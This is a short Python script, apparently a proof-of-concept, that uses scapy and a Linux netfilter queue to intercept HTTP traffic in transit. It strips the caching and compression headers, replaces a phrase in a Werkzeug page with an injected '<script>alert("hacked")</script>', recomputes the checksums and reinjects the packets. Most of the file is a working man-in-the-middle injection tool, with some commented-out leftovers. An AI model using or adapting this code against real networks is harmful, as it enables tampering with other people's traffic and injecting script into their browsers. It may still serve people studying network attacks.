
import fnfqueue
from scapy.all import *

queue = 0

conn = fnfqueue.Connection()

try:
    q = conn.bind(queue)
    q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
except PermissionError:
    print("Access denied; Do I have root rights or the needed capabilities?")
    sys.exit(-1)

search_for  = b'Werkzeug provides a couple of fu'
replace_for = b'<script>alert("hacked")</script>'

while True:
    for packet in conn:

        pkt = IP(packet.payload)

        if Raw not in pkt:
            packet.accept()
            continue

        #print(pkt[Ether])

        pkt[Raw].load = re.sub(r'If-Modified-Since.*\r\n'.encode(), b'', pkt[Raw].load)
        pkt[Raw].load = re.sub(r'If-None-Match.*\r\n'.encode(), b'', pkt[Raw].load)
        pkt[Raw].load = re.sub(r'Accept-Encoding.*\r\n'.encode(), b'', pkt[Raw].load)
        pkt[Raw].load = pkt[Raw].load.replace(search_for, replace_for)

        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum

        packet.payload = bytes(pkt)
        packet.mangle()
        #print('.')

        print(pkt.show2())
        continue



        #if Raw not in pkt:
        #    packet.accept()
        #    continue

        #if b'If-Modified-Since' in pkt[Raw].load:


        #print(pkt[Raw])

        #packet.accept()
        #continue
        #p[Raw].load = p[Raw].load[:-1] + b'\x00'

        #if packet.payload == bytes(pkt):
        #    packet.accept()
        #    continue

        #del pkt[IP].len
        #del pkt[IP].chksum
        #del pkt[TCP].chksum

        #packet.payload = bytes(pkt)
        #pkt.show2()
        #packet.mangle()

    #except fnfqueue.BufferOverflowException:
    #    print("buffer error")
    #    pass

conn.close()


